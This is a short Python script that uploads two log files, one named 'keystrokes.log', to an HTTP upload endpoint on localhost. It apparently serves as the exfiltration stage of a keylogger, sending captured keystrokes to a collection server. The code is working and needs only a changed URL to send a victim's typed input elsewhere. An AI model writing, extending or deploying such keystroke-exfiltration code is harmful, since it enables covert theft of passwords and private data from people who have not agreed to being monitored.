import requests, os

def upload_file(path, endpoint):
    with open(path, 'rb') as f:
        res = requests.post(endpoint, files={'file': f})
        print(f"Uploaded {path}: {res.status_code}")

if __name__ == '__main__':
    server_url = 'http://127.0.0.1:8000/upload/'
    for file_name in ['keystrokes.log', 'launcher_status.log']:
        if os.path.exists(file_name):
            upload_file(file_name, server_url)